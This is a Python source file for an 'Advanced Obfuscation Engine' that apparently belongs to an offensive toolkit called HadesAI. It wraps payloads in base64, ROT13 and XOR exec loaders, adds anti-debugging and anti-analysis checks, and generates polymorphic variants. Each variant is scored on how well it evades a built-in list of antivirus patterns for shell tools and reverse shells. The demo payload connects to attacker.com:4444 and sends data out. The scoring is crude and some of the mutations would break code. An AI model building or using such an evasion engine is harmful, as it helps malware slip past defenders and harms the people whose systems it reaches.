"""
Advanced Obfuscation Engine for HadesAI Phase 2
Polymorphic code transformation and detection evasion
"""

import base64
import hashlib
import json
import logging
import random
import string
import time
import sqlite3
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, asdict, field
from enum import Enum

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# ==================== ENUMS ====================

class ObfuscationTechnique(Enum):
    """Available obfuscation techniques"""
    BASE64_ENCODING = "base64_encoding"
    ROT13_CIPHER = "rot13_cipher"
    VARIABLE_RENAMING = "variable_renaming"
    CODE_INJECTION = "code_injection"
    POLYMORPHIC_MUTATION = "polymorphic_mutation"
    DEAD_CODE_INSERTION = "dead_code_insertion"
    LOGIC_OBFUSCATION = "logic_obfuscation"
    ANTI_DEBUGGING = "anti_debugging"
    ANTI_ANALYSIS = "anti_analysis"
    ENCRYPTION = "encryption"


class PayloadLanguage(Enum):
    """Supported payload languages"""
    PYTHON = "python"
    BASH = "bash"
    POWERSHELL = "powershell"
    JAVASCRIPT = "javascript"
    C_SHARP = "c#"
    VB_NET = "vb.net"


# ==================== DATA CLASSES ====================

@dataclass
class ObfuscationProfile:
    """Configuration for obfuscation"""
    profile_id: str
    name: str
    techniques: List[ObfuscationTechnique]
    intensity: int  # 1-10, higher = more obfuscation
    target_language: PayloadLanguage
    add_junk_code: bool = True
    anti_analysis_features: bool = True
    polymorphic: bool = True
    encryption_level: int = 0  # 0=none, 1=light, 2=heavy


@dataclass
class ObfuscatedPayload:
    """Result of obfuscation"""
    payload_id: str
    original_length: int
    obfuscated_length: int
    techniques_applied: List[ObfuscationTechnique]
    obfuscated_code: str
    evasion_score: float  # 0-1, higher = better evasion
    detection_risk: float  # 0-1, lower = safer
    execution_overhead_percent: float
    signature_complexity: float
    polymorphic_variant: int = 0
    created_at: float = field(default_factory=time.time)


@dataclass
class DetectionSignature:
    """Known detection signature"""
    signature_id: str
    name: str
    pattern: str
    detector_type: str  # "antivirus", "heuristic", "behavioral"
    severity: int  # 1-10
    effectiveness: float  # 0-1
    language: PayloadLanguage


# ==================== ADVANCED OBFUSCATION ENGINE ====================

class AdvancedObfuscationEngine:
    """Performs polymorphic code transformation and detection evasion"""
    
    def __init__(self, db_path: str = "phase2_obfuscation.db"):
        self.db_path = db_path
        self.obfuscated_payloads: Dict[str, ObfuscatedPayload] = {}
        self.detection_signatures: Dict[str, DetectionSignature] = {}
        self.polymorphic_cache: Dict[str, List[str]] = {}  # payload_id -> variants
        self.evasion_techniques: Dict[str, callable] = {}
        
        self._init_db()
        self._initialize_signatures()
        self._initialize_techniques()
    
    def _init_db(self):
        """Initialize database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
            CREATE TABLE IF NOT EXISTS obfuscated_payloads (
                payload_id TEXT PRIMARY KEY,
                original_length INTEGER,
                obfuscated_length INTEGER,
                techniques TEXT,
                obfuscated_code TEXT,
                evasion_score REAL,
                detection_risk REAL,
                created_at REAL
            )
            """)
            
            conn.execute("""
            CREATE TABLE IF NOT EXISTS detection_signatures (
                signature_id TEXT PRIMARY KEY,
                name TEXT,
                pattern TEXT,
                detector_type TEXT,
                severity INTEGER,
                effectiveness REAL,
                language TEXT
            )
            """)
            
            conn.execute("""
            CREATE TABLE IF NOT EXISTS polymorphic_variants (
                payload_id TEXT,
                variant_num INTEGER,
                variant_code TEXT,
                created_at REAL
            )
            """)
            
            conn.commit()
    
    def _initialize_signatures(self):
        """Initialize known detection signatures"""
        signatures = [
            DetectionSignature(
                signature_id="sig_001",
                name="Common Shell Commands",
                pattern=r"(bash|sh|cmd|powershell|nc|wget|curl)",
                detector_type="antivirus",
                severity=8,
                effectiveness=0.75,
                language=PayloadLanguage.BASH
            ),
            DetectionSignature(
                signature_id="sig_002",
                name="Python Eval Detection",
                pattern=r"eval\s*\(",
                detector_type="heuristic",
                severity=9,
                effectiveness=0.85,
                language=PayloadLanguage.PYTHON
            ),
            DetectionSignature(
                signature_id="sig_003",
                name="Reverse Shell Pattern",
                pattern=r"socket\.socket|/bin/sh|cmd\.exe",
                detector_type="behavioral",
                severity=10,
                effectiveness=0.90,
                language=PayloadLanguage.PYTHON
            ),
            DetectionSignature(
                signature_id="sig_004",
                name="Registry Edit Pattern",
                pattern=r"reg\s+add|HKLM:|RegOpenKeyEx",
                detector_type="antivirus",
                severity=8,
                effectiveness=0.80,
                language=PayloadLanguage.POWERSHELL
            ),
        ]
        
        for sig in signatures:
            self.detection_signatures[sig.signature_id] = sig
    
    def _initialize_techniques(self):
        """Initialize obfuscation technique implementations"""
        self.evasion_techniques = {
            ObfuscationTechnique.BASE64_ENCODING: self._base64_encode,
            ObfuscationTechnique.ROT13_CIPHER: self._rot13_encode,
            ObfuscationTechnique.VARIABLE_RENAMING: self._rename_variables,
            ObfuscationTechnique.CODE_INJECTION: self._inject_dead_code,
            ObfuscationTechnique.POLYMORPHIC_MUTATION: self._polymorphic_mutate,
            ObfuscationTechnique.DEAD_CODE_INSERTION: self._insert_dead_code,
            ObfuscationTechnique.LOGIC_OBFUSCATION: self._obfuscate_logic,
            ObfuscationTechnique.ANTI_DEBUGGING: self._add_anti_debug,
            ObfuscationTechnique.ANTI_ANALYSIS: self._add_anti_analysis,
            ObfuscationTechnique.ENCRYPTION: self._encrypt_payload,
        }
    
    def transform_payload(self, payload: str, profile: Optional[ObfuscationProfile] = None) -> ObfuscatedPayload:
        """Transform payload using obfuscation techniques"""
        if profile is None:
            profile = self._create_default_profile()
        
        original_length = len(payload)
        obfuscated = payload
        applied_techniques = []
        execution_overhead = 0.0
        
        # Apply techniques in sequence
        for technique in profile.techniques:
            if technique in self.evasion_techniques:
                try:
                    obfuscated = self.evasion_techniques[technique](obfuscated)
                    applied_techniques.append(technique)
                    execution_overhead += 0.05  # Each technique adds ~5% overhead
                except Exception as e:
                    logger.warning(f"Failed to apply {technique.value}: {e}")
        
        # Add junk code if enabled
        if profile.add_junk_code:
            obfuscated = self._inject_junk_code(obfuscated, profile.intensity)
            execution_overhead += 0.10
        
        # Add anti-analysis features if enabled
        if profile.anti_analysis_features:
            obfuscated = self._add_anti_analysis(obfuscated)
            execution_overhead += 0.08
        
        # Calculate metrics
        obfuscated_length = len(obfuscated)
        evasion_score = self._calculate_evasion_score(obfuscated, profile)
        detection_risk = self._calculate_detection_risk(obfuscated, profile.target_language)
        signature_complexity = self._calculate_signature_complexity(obfuscated)
        
        # Create payload record
        payload_id = hashlib.md5(payload.encode()).hexdigest()[:12]
        obfuscated_payload = ObfuscatedPayload(
            payload_id=payload_id,
            original_length=original_length,
            obfuscated_length=obfuscated_length,
            techniques_applied=applied_techniques,
            obfuscated_code=obfuscated,
            evasion_score=evasion_score,
            detection_risk=detection_risk,
            execution_overhead_percent=execution_overhead,
            signature_complexity=signature_complexity
        )
        
        self.obfuscated_payloads[payload_id] = obfuscated_payload
        self._store_payload(obfuscated_payload)
        
        logger.info(f"Payload obfuscated: {payload_id} (evasion: {evasion_score:.0%}, risk: {detection_risk:.0%})")
        return obfuscated_payload
    
    def generate_polymorphic_variants(self, payload_id: str, num_variants: int = 5) -> List[str]:
        """Generate polymorphic variants of payload"""
        if payload_id not in self.obfuscated_payloads:
            return []
        
        original_payload = self.obfuscated_payloads[payload_id].obfuscated_code
        variants = []
        
        for i in range(num_variants):
            variant = self._create_polymorphic_variant(original_payload, i)
            variants.append(variant)
            self._store_variant(payload_id, i, variant)
        
        self.polymorphic_cache[payload_id] = variants
        logger.info(f"Generated {num_variants} polymorphic variants for {payload_id}")
        return variants
    
    def estimate_detection_evasion(self, payload: str, language: PayloadLanguage) -> Tuple[float, List[str]]:
        """Estimate evasion rate against known signatures"""
        evasion_score = 1.0
        evaded_signatures = []
        
        for sig_id, signature in self.detection_signatures.items():
            if signature.language != language:
                continue
            
            # Check if payload triggers signature
            import re
            try:
                if re.search(signature.pattern, payload, re.IGNORECASE):
                    # Signature matches - evasion failed
                    evasion_score -= (signature.effectiveness * 0.1)
                else:
                    # Signature does not match - evasion successful
                    evaded_signatures.append(sig_id)
            except:
                pass
        
        evasion_score = max(0, min(evasion_score, 1.0))
        return evasion_score, evaded_signatures
    
    # ==================== OBFUSCATION TECHNIQUES ====================
    
    def _base64_encode(self, code: str) -> str:
        """Base64 encoding with wrapper"""
        encoded = base64.b64encode(code.encode()).decode()
        if code.startswith("#!/"):  # Python shebang
            wrapper = f'''#!/usr/bin/python3
import base64
exec(base64.b64decode('{encoded}').decode())'''
        else:
            wrapper = f'''import base64
exec(base64.b64decode('{encoded}').decode())'''
        return wrapper
    
    def _rot13_encode(self, code: str) -> str:
        """ROT13 encoding with decoder"""
        import codecs
        encoded = codecs.encode(code, 'rot_13')
        wrapper = f'''import codecs
code = codecs.decode("""{encoded}""", 'rot_13')
exec(code)'''
        return wrapper
    
    def _rename_variables(self, code: str) -> str:
        """Rename variables to obfuscate"""
        import re
        var_map = {}
        counter = 0
        
        # Find all identifiers
        identifiers = set(re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', code))
        
        # Create mappings for non-builtin identifiers
        for identifier in identifiers:
            if not self._is_builtin(identifier):
                var_map[identifier] = f"v{counter}"
                counter += 1
        
        # Replace in code
        obfuscated = code
        for old, new in var_map.items():
            obfuscated = re.sub(r'\b' + old + r'\b', new, obfuscated)
        
        return obfuscated
    
    def _inject_dead_code(self, code: str) -> str:
        """Inject dead code to confuse analysis"""
        dead_code_snippets = [
            "x = 42; y = x * 2; z = y + 1",
            "for i in range(100): pass",
            "if False: print('never')",
            "def dummy(): return None; dummy()",
            "random_var = 'dummy_string'",
        ]
        
        snippet = random.choice(dead_code_snippets)
        lines = code.split('\n')
        insertion_point = random.randint(1, max(1, len(lines) - 1))
        lines.insert(insertion_point, snippet)
        
        return '\n'.join(lines)
    
    def _polymorphic_mutate(self, code: str) -> str:
        """Mutate code while preserving functionality"""
        # Simple mutations: equivalent operations
        mutations = {
            'x = x + 1': 'x += 1',
            'if True:': 'if 1:',
            '== True': '== 1',
            '== False': '== 0',
            'and': '&',
            'or': '|',
        }
        
        mutated = code
        for old_form, new_form in mutations.items():
            mutated = mutated.replace(old_form, new_form)
        
        return mutated
    
    def _insert_dead_code(self, code: str) -> str:
        """Insert realistic dead code"""
        junk_functions = '''
def _init_system():
    import sys
    import os
    return True

def _validate_environment():
    try:
        import random
        random.seed(42)
        return True
    except:
        pass
'''
        return code + '\n' + junk_functions
    
    def _obfuscate_logic(self, code: str) -> str:
        """Obfuscate logical flow"""
        # Convert simple conditionals to ternary
        import re
        obfuscated = re.sub(
            r'if\s+(\w+)\s*:\s*(\w+)\s*=\s*(.+)',
            r'\2 = \3 if \1 else \2',
            code
        )
        return obfuscated
    
    def _add_anti_debug(self, code: str) -> str:
        """Add anti-debugging code"""
        anti_debug = '''
import sys
def anti_debug():
    if sys.gettrace() is not None:
        exit(1)
anti_debug()
'''
        return anti_debug + '\n' + code
    
    def _add_anti_analysis(self, code: str) -> str:
        """Add anti-analysis code"""
        anti_analysis = '''
import sys
import os
if 'pdb' in sys.modules or 'ipdb' in sys.modules:
    exit(1)
if os.path.exists('/proc/self/fd/3'):
    exit(1)
'''
        return anti_analysis + '\n' + code
    
    def _encrypt_payload(self, code: str) -> str:
        """Encrypt payload"""
        # Simple XOR encryption for demo
        key = random.randint(1, 255)
        encrypted = ''.join(chr(ord(c) ^ key) for c in code)
        
        wrapper = f'''
import base64
key = {key}
encrypted = {repr(encrypted)}
code = ''.join(chr(ord(c) ^ key) for c in encrypted)
exec(code)
'''
        return wrapper
    
    def _inject_junk_code(self, code: str, intensity: int) -> str:
        """Inject junk code based on intensity"""
        junk = code
        
        for _ in range(intensity):
            junk_line = random.choice([
                f"_{random.randint(1000, 9999)} = {random.randint(1, 1000000)}",
                f"pass  # {random.choice(['system check', 'validation', 'initialization'])}",
                f"# {random.choice(['TODO', 'FIXME', 'NOTE'])}: obfuscated code"
            ])
            lines = junk.split('\n')
            insert_point = random.randint(0, len(lines) - 1)
            lines.insert(insert_point, junk_line)
            junk = '\n'.join(lines)
        
        return junk
    
    def _create_polymorphic_variant(self, code: str, variant_num: int) -> str:
        """Create a unique polymorphic variant"""
        # Add unique marker
        marker = f"# Variant {variant_num} - {hashlib.md5(str(time.time() + variant_num).encode()).hexdigest()[:8]}"
        variant = marker + '\n' + code
        
        # Apply random mutations
        if variant_num % 2 == 0:
            variant = self._base64_encode(variant)
        else:
            variant = self._rot13_encode(variant)
        
        return variant
    
    def _is_builtin(self, identifier: str) -> bool:
        """Check if identifier is Python builtin"""
        builtins = {
            'print', 'len', 'range', 'str', 'int', 'list', 'dict', 'set',
            'exec', 'eval', 'open', 'file', 'import', 'None', 'True', 'False',
            'Exception', 'ValueError', 'TypeError', 'pass', 'if', 'else', 'for'
        }
        return identifier in builtins
    
    def _calculate_evasion_score(self, payload: str, profile: ObfuscationProfile) -> float:
        """Calculate evasion effectiveness score"""
        score, evaded = self.estimate_detection_evasion(payload, profile.target_language)
        
        # Boost score based on techniques applied
        technique_bonus = len(profile.techniques) * 0.05
        score = min(score + technique_bonus, 1.0)
        
        # Bonus for polymorphism
        if profile.polymorphic:
            score = min(score + 0.15, 1.0)
        
        return score
    
    def _calculate_detection_risk(self, payload: str, language: PayloadLanguage) -> float:
        """Calculate risk of detection"""
        _, evaded = self.estimate_detection_evasion(payload, language)
        
        # Risk is inverse of evasion score
        all_sigs = [s for s in self.detection_signatures.values() if s.language == language]
        if not all_sigs:
            return 0.5
        
        risk = 1.0 - (len(evaded) / len(all_sigs))
        return max(0, min(risk, 1.0))
    
    def _calculate_signature_complexity(self, payload: str) -> float:
        """Calculate signature complexity"""
        # Simple metric: ratio of unique to total characters
        if not payload:
            return 0.0
        
        unique_chars = len(set(payload))
        total_chars = len(payload)
        complexity = unique_chars / max(total_chars, 1)
        
        return complexity
    
    def _create_default_profile(self) -> ObfuscationProfile:
        """Create default obfuscation profile"""
        return ObfuscationProfile(
            profile_id="default",
            name="Default Profile",
            techniques=[
                ObfuscationTechnique.BASE64_ENCODING,
                ObfuscationTechnique.VARIABLE_RENAMING,
                ObfuscationTechnique.DEAD_CODE_INSERTION,
            ],
            intensity=5,
            target_language=PayloadLanguage.PYTHON,
            add_junk_code=True,
            anti_analysis_features=True,
            polymorphic=True
        )
    
    def _store_payload(self, payload: ObfuscatedPayload):
        """Store obfuscated payload"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute("""
                INSERT OR REPLACE INTO obfuscated_payloads
                (payload_id, original_length, obfuscated_length, techniques, obfuscated_code,
                 evasion_score, detection_risk, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    payload.payload_id,
                    payload.original_length,
                    payload.obfuscated_length,
                    json.dumps([t.value for t in payload.techniques_applied]),
                    payload.obfuscated_code,
                    payload.evasion_score,
                    payload.detection_risk,
                    payload.created_at
                ))
                conn.commit()
        except Exception as e:
            logger.error(f"Error storing payload: {e}")
    
    def _store_variant(self, payload_id: str, variant_num: int, code: str):
        """Store polymorphic variant"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute("""
                INSERT INTO polymorphic_variants
                (payload_id, variant_num, variant_code, created_at)
                VALUES (?, ?, ?, ?)
                """, (payload_id, variant_num, code, time.time()))
                conn.commit()
        except Exception as e:
            logger.error(f"Error storing variant: {e}")


# ==================== EXAMPLE USAGE ====================

def demo_obfuscation():
    """Demonstrate obfuscation engine"""
    print("=" * 80)
    print("Advanced Obfuscation Engine Demo")
    print("=" * 80)
    
    engine = AdvancedObfuscationEngine()
    
    # Sample payload
    payload = '''import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
s.send(b"Compromised")
s.close()'''
    
    # Create obfuscation profile
    profile = ObfuscationProfile(
        profile_id="aggressive",
        name="Aggressive Evasion",
        techniques=[
            ObfuscationTechnique.BASE64_ENCODING,
            ObfuscationTechnique.VARIABLE_RENAMING,
            ObfuscationTechnique.POLYMORPHIC_MUTATION,
            ObfuscationTechnique.DEAD_CODE_INSERTION,
        ],
        intensity=8,
        target_language=PayloadLanguage.PYTHON,
        add_junk_code=True,
        anti_analysis_features=True,
        polymorphic=True
    )
    
    print("\nOriginal Payload:")
    print("-" * 80)
    print(payload)
    
    # Obfuscate
    obfuscated = engine.transform_payload(payload, profile)
    
    print("\n" + "=" * 80)
    print("Obfuscation Results")
    print("=" * 80)
    print(f"Payload ID: {obfuscated.payload_id}")
    print(f"Original Length: {obfuscated.original_length} bytes")
    print(f"Obfuscated Length: {obfuscated.obfuscated_length} bytes")
    print(f"Size Increase: {(obfuscated.obfuscated_length / obfuscated.original_length - 1) * 100:.1f}%")
    print(f"Evasion Score: {obfuscated.evasion_score:.0%}")
    print(f"Detection Risk: {obfuscated.detection_risk:.0%}")
    print(f"Execution Overhead: {obfuscated.execution_overhead_percent:.1f}%")
    print(f"Signature Complexity: {obfuscated.signature_complexity:.3f}")
    print(f"Techniques Applied: {', '.join(t.value for t in obfuscated.techniques_applied)}")
    
    # Generate variants
    print("\n" + "=" * 80)
    print("Polymorphic Variants")
    print("=" * 80)
    variants = engine.generate_polymorphic_variants(obfuscated.payload_id, num_variants=3)
    print(f"Generated {len(variants)} variants")
    for i, variant in enumerate(variants):
        print(f"\nVariant {i}:")
        print(f"  Length: {len(variant)} bytes")
        print(f"  Preview: {variant[:80]}...")


if __name__ == "__main__":
    demo_obfuscation()
